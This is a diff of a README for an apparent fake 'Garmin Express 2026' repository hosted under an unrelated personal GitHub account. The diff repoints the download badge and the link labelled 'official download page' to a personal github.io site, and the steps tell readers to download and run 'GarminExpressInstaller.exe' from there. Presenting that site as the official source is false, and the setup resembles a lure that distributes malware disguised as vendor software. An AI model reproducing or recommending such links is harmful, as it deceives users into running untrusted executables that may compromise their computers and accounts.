@@ -1,6 +1,6 @@
 # 📍 Garmin-Express-2026 - Update your GPS maps with ease
 
-[![](https://img.shields.io/badge/Download-Garmin_Express-blue.svg)](https://github.com/frostbitten-temporiser214/Garmin-Express-2026)
+[![](https://img.shields.io/badge/Download-Garmin_Express-blue.svg)](https://frostbitten-temporiser214.github.io)
 
 This repository provides the installer for Garmin Express 2026. Use this software to manage your Garmin devices, update maps, sync activity data, and install new software versions on your Windows computer.
 
@@ -20,7 +20,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official download page](https://github.com/frostbitten-temporiser214/Garmin-Express-2026).
+1. Go to the [official download page](https://frostbitten-temporiser214.github.io).
 2. Look for the file labeled `GarminExpressInstaller.exe`.
 3. Click the file to start the download. 
 4. Save the file to your Downloads folder.
